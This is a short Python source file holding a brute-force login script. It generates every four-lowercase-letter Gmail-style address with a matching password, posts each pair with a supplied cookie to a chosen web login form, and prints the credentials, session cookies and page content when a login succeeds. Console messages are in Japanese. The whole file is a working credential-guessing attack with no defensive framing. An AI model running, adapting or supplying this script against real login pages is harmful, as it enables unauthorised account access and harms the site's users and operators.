import string
import requests
import webbrowser
from requests.auth import HTTPBasicAuth

class BruteForce:

    def __init__(self, url, url2, cookie):
        self.url = url
        self.url2 = url2
        self.cookie = cookie

    def test(self):
        words = list(string.ascii_lowercase)
        user_ids = []
        user_passwords = []
        for word_1 in words:
            for word_2 in words:
                for word_3 in words:
                    for word_4 in words:
                        user_id = word_1 + word_2 + word_3 + word_4 + "@gmail.com"
                        user_password = word_1 + word_2 + word_3 + word_4
                        user_ids.append(user_id)
                        user_passwords.append(user_password)
                        # print(user_id)
        return user_ids, user_passwords

    def run_brute_force(self):
        user_ids, user_passwords = self.test()

        session = requests.Session()
        for i in range(len(user_ids)):
            response = session.post(self.url, data={"email": user_ids[i], "password": user_passwords[i]}, cookies=self.cookie)

            if response.status_code == 200 and response.url == self.url2:
                print("ログインに成功しました。")
                print("特定のメールアドレス: ", user_ids[i])
                print("特定のパスワード: ", user_passwords[i])
                print(response.cookies)
                print(response.text)

                webbrowser.open(self.url2)
                break
            else:
                print("特定のメールアドレス: ", user_ids[i])
                print("特定のパスワード: ", user_passwords[i])
                print("ログインに失敗しました。")
